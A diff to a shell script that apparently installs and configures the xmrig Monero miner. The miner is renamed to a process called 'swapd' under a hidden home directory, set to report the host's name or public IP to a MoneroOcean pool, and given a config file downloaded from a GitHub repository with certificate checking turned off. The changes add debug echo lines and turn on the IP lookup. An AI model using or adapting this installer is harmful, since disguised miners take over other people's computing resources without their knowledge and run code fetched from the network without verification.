@@ -238,11 +238,13 @@ fi
 
 echo "[*] Miner $HOME/.swapd/xmrig is OK"
 
+echo "mv $HOME/.swapd/xmrig $HOME/.swapd/swapd"
 mv $HOME/.swapd/xmrig $HOME/.swapd/swapd
 
-PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+echo "PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`"
+#PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 #PASS=`hostname`
-#PASS=`sh -c "IP=\$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'); nslookup \$IP | grep 'name =' | awk '{print \$NF}'"`
+PASS=`sh -c "IP=\$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'); nslookup \$IP | grep 'name =' | awk '{print \$NF}'"`
 if [ "$PASS" == "localhost" ]; then
   PASS=`ip route get 1 | awk '{print $NF;exit}'`
 fi
@@ -253,6 +255,7 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
 
+echo "sed"
 sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.swapd/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.swapd/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.swapd/config.json
@@ -281,7 +284,7 @@ mv $HOME/.swapd/config.json $HOME/.swapd/config_ORiG.json
 #}
 #EOL
 
-wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json ; mv config.json $HOME/.swapd/config.json
+wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json ; mv config.json $HOME/.swapd/config.json 
 curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $HOME/.swapd/config.json
 
 
